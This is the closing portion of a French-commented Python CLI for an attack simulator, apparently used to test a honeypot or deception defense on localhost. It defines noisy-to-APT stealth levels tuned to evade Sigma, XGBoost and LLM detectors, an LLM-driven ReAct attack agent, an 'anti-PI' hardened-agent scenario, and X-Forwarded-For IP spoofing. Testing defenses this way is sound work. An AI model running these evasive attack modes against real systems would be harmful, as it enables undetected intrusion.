    "noisy": level_noisy,
    "evasive": level_evasive,
    "stealth": level_stealth,
    "ai-agent": level_ai_agent,
    "apt": level_apt,
    # End-to-end Dev D scenarios
    "naive-full": scenario_naive_full,
    "hardened-agent": scenario_hardened_agent,
    "apt-bypass": scenario_apt_bypass,
    # Historical aliases
    "recon": pattern_recon,
    "brute": pattern_brute,
    "traversal": pattern_traversal,
    "ai-recon": pattern_ai_recon,
}


# ─── Entry point ────────────────────────────────────────────────────────

async def main_async(args: argparse.Namespace) -> None:
    level = args.level

    if level not in LEVELS:
        raise SystemExit(f"Niveau inconnu: {level!r} — choisir parmi {list(LEVELS)}")

    # Initialize the LLM brain if an API is provided
    brain: AgentBrain | None = None
    if level == "ai-agent":
        ai_url = args.ai_endpoint or os.environ.get("AI_ENDPOINTS_BASE_URL", "")
        ai_key = args.ai_key or os.environ.get("AI_ENDPOINTS_API_KEY", "")
        ai_model = args.ai_model or os.environ.get("AI_MODEL_GENERATOR", "") or os.environ.get("AI_MODEL_CLASSIFIER", "") or "Llama-3.1-8B-Instruct"
        brain = AgentBrain(base_url=ai_url, api_key=ai_key, model=ai_model)
        if not brain.enabled:
            print("\033[1;31m[ERREUR] Aucune API LLM configurée — l'agent ai-agent ne peut pas tourner.\033[0m")
            print("          Fournir --ai-endpoint + --ai-key (ou AI_ENDPOINTS_BASE_URL/API_KEY).")
            print("          Pas de repli scripté : sans LLM réel, il n'y a pas d'attaque.\n")

    fn = LEVELS[level]

    # Modern levels take kwargs, the old patterns take rps + duration_s
    if level in ("recon", "brute", "traversal", "ai-recon"):
        await fn(args.target, args.rps, args.duration)
    elif level == "ai-agent":
        await fn(args.target, args.duration, brain=brain)
    else:
        await fn(args.target, args.duration, rps=args.rps)


def main() -> None:
    ap = argparse.ArgumentParser(
        description="MIR[AI]ge Attack Simulator — 5 niveaux de furtivité",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Niveaux disponibles :
  noisy           Scanner naïf (Nuclei UA, 30 RPS)       → T0 Sigma immédiat
  evasive         Bot masqué (timing 500ms)               → T1 XGBoost
  stealth         Agent lent (timing 2-3.5s)              → T2 LLM uniquement
  ai-agent        Cerveau LLM réel (ReAct)                → T2 / variable
  apt             Ultra-patient (5-15s)                   → démontre les limites honnêtes

Scénarios end-to-end (mesure ASYMMETRIC_RATIO) :
  naive-full      Agent naïf — traverse les 14 mécanismes → attendu 5-50×
  hardened-agent  Agent durci (max_iter=25, anti-PI)       → attendu 1-5× (honnête)
  apt-bypass      Menace persistante sous les radars       → attendu ~1× (limite honnête)

Alias compatibilité : recon, brute, traversal, ai-recon

Exemples :
  python3 attack.py --target http://localhost:8090 --level noisy --duration 15
  python3 attack.py --target http://localhost:8090 --level naive-full --duration 120
  python3 attack.py --target http://localhost:8090 --level hardened-agent --duration 30
  python3 attack.py --target http://localhost:8090 --level apt-bypass --duration 90
  python3 attack.py --target http://localhost:8080 --level ai-agent \\
    --ai-endpoint <OPENAI_COMPATIBLE_BASE_URL>/v1 \\
    --ai-key <TOKEN> --ai-model <MODEL_NAME> --duration 60
        """,
    )
    ap.add_argument("--target", required=True, help="URL cible ex: http://localhost:8090")
    ap.add_argument(
        "--level", "--pattern",
        dest="level",
        default="naive-full",
        choices=list(LEVELS),
        metavar="LEVEL",
        help="Niveau d'attaque (défaut: naive-full)",
    )
    ap.add_argument("--rps", type=int, default=20, help="Requêtes/seconde (niveaux noisy/evasive)")
    ap.add_argument("--duration", type=int, default=30, help="Durée en secondes (défaut: 30)")
    ap.add_argument("--ai-endpoint", default="", help="URL base API LLM (OpenAI-compatible)")
    ap.add_argument("--ai-key", default="", help="Clé API pour le cerveau LLM")
    ap.add_argument("--ai-model", default="", help="Modèle LLM OVH (ex: Qwen3-32B, gpt-oss-20b, Meta-Llama-3_3-70B-Instruct)")
    ap.add_argument("--source-ip", default="", dest="source_ip",
                    help="IP source simulée via X-Forwarded-For (utile depuis le dashboard "
                         "pour générer une nouvelle session par lancement)")
    ap.add_argument("--metrics-url", default=os.environ.get("MIRAGE_METRICS_URL", ""),
                    dest="metrics_url",
                    help="URL du service metrics — niveau ai-agent y reporte la conso LLM RÉELLE "
                         "(usage OVH) → coût OVH EUR exact dans le dashboard")
    ap.add_argument("--bodies-file", default="", dest="bodies_file",
                    help="Fichier JSONL où enregistrer les bodies complets reçus (affichés en entier "
                         "au clic dans le dashboard, ex. /.env)")
    args = ap.parse_args()
    if args.source_ip:
        global _SOURCE_IP
        _SOURCE_IP = args.source_ip
        print(f"\033[2m[Spoof] X-Forwarded-For = {_SOURCE_IP} sur toutes les requêtes\033[0m")
    if args.metrics_url:
        global _METRICS_URL
        _METRICS_URL = args.metrics_url
    if args.bodies_file:
        global _BODIES_FILE
        _BODIES_FILE = args.bodies_file
        try:
            open(_BODIES_FILE, "w").close()   # start fresh on each run
        except OSError:
            pass
    asyncio.run(main_async(args))


if __name__ == "__main__":
    main()
